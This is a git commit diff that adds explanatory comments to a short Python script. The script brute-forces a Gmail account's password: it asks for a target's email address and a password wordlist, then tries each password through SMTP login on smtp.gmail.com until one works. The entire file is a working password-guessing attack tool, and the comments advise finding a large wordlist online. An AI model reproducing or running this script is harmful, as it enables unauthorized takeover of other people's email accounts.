dcb0427c40f3d35885b3f5937fd18a8f7533381c
W33K <rabi3dread3@gmail.com>
2016-07-28 22:25:55 +0100

    Added Some Comments To Explain the code

--- Script.py
+++ Script.py
@@ -1,19 +1,19 @@
-import smtplib
+import smtplib # as you can see -_- declaring the SMTP  Library
 
-smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587) #SMTP Server Configs Just Follow the instructions of README.md for more informations
 smtpserver.ehlo()
 smtpserver.starttls()
 
 user = input("Enter the target's email address: ")
-passwfile = input("Enter the password file name: ")
+passwfile = input("Enter the password file name: ")#Search For a Big One in the internet
 passwfile = open(passwfile, "r")
 
 for password in passwfile:
     try:
         smtpserver.login(user, password)
 
-        print("[+] Password Found: %s" % password)
+        print("[+] Password Found: %s" % password) # In Case One the passwords in the passlist works It Will return you "[+] Password Found: blablabla"
 
         break;
     except smtplib.SMTPAuthenticationError:
-        print("[!] Password Incorrect: %s" % password)
+        print("[!] Password Incorrect: %s" % password) #In Case There is an error like password is Wrong or something related to this it will return you An Error message 
